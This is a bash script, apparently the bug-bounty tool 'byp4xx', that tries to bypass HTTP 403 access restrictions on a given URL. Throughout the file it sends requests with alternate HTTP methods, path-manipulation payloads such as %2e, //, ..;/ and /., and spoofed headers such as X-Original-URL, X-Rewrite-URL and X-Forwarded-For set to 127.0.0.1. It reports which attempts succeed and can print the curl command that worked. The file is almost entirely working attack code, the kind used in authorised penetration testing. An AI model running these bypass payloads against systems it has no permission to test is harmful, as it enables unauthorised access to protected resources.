#!/bin/bash

if [ "$#" -lt 1 ] || [ "$#" -gt 3 ]
then
	echo "Usage: ./byp4xx.sh [OPTIONS] http://url/path/"
	echo "OPTIONS:"
	echo "	-c Return curl command if response is 200"
	echo "	-r Allow redirection if response is 3XX"
	exit
fi

#Check URL starts with http*
echo ${@: -1} | grep -i ^http > /dev/null
if [ $? -gt 0 ] 
then
	echo "Note: Start your url with http:// or https://"
	exit
fi

#Check optional arguments
OUTPUTCURL="N"
if [[ $(echo $*) == *"-c "* ]]
then
		OUTPUTCURL="Y"
fi

REDIRECT=""
if [[ $(echo $*) == *"-r "* ]]
then
		REDIRECT="-L"
fi
#Parse URL and DIR
URL=$(echo ${@: -1} | cut -d "/" -f -3)"/"
DIR=$(echo ${@: -1} | cut -d "/" -f 4- | sed -e 's/\/$//g')
echo

#HTTP Verbs/Methods
echo -e "[+]HTTP Methods..."
echo -n "GET request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "POST request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "Content-Length:0" -X POST $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"Content-Length:0\" -X POST $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "HEAD request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -m 1 -w "%{http_code}" -X HEAD $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -m 1 -X HEAD $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "OPTIONS request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X OPTIONS $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X OPTIONS $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "PUT request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X PUT $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X PUT $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi

#DELETE disabled by default, too dangerous
#echo -n "DELETE request: "

echo -n "TRACE request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X TRACE $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X TRACE $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "TRACK request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X TRACK $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X TRACK $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "CONNECT request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X CONNECT $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X CONNECT $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "PATCH request: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X PATCH $URL$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X PATCH $URL$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo
#Bugbountytips methods compilation
echo -e "[+]#Bugbountytips 403 bypass methods..."
echo -n "%2e payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET $URL%2e/$DIR)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET $URL%2e/$DIR"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi

echo -n "/. payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null --path-as-is -w "%{http_code}" -X GET "$URL$DIR/.")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki --path-as-is -X GET "URL$DIR/.""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi

echo -n "? payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR?)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET $URL$DIR?"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi

echo -n "?? payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR??)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET $URL$DIR??"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "// payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET $URL/$DIR//)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET $URL/$DIR//"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "/./ payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null --path-as-is -w "%{http_code}" -X GET $URL./$DIR/./)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki --path-as-is -X GET $URL./$DIR/./"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"

else
echo -e "$STATUS"
fi
echo -n "/ payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET $URL$DIR/)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET $URL$DIR/"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "/.randomstring payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET "$URL$DIR/".randomstring)
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET \"$URL$DIR/\".randomstring"; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "..;/ payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -X GET "$URL$DIR..;/")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -X GET \"$URL$DIR..;/\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo
#HEADERS
echo -e "[+]HEADERS..."
echo -n "Referer payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "Referer: $URL$DIR" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"Referer: $URL$DIR\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Custom-IP-Authorization payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Custom-IP-Authorization: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Custom-IP-Authorization+..;/ payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL$DIR..;/")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Custom-IP-Authorization: 127.0.0.1\" -X GET \"$URL$DIR..;/\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Original-URL payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /$DIR" -X GET $URL"anything")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Original-URL: /$DIR\" -X GET $URL\"anything\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Rewrite-URL payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Rewrite-URL: /$DIR" -X GET "$URL")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Rewrite-URL: /$DIR\" -X GET \"$URL\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Originating-IP payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Originating-IP: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Forwarded-For payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Forwarded-For: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Remote-IP payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Remote-IP: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Client-IP payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Client-IP: 127.0.0.1" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Client-IP: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Host payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Host: 127.0.0.1" -X GET "$URL$DIR")
if [[ ${STATUS} =~ 2.. ]]
then
	if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Host: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
echo -n "X-Forwarded-Host payload: "
STATUS=$(curl $REDIRECT -k -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL$DIR")
if [ "$OUTPUTCURL" = "Y" ]; then CURL=" => curl $REDIRECT -ki -H \"X-Forwarded-Host: 127.0.0.1\" -X GET \"$URL$DIR\""; else CURL=""; fi
if [[ ${STATUS} =~ 2.. ]]
then
	echo -e "$STATUS$CURL"
elif [[ ${STATUS} =~ 3.. ]]
then 
	echo -e "$STATUS"
else
echo -e "$STATUS"
fi
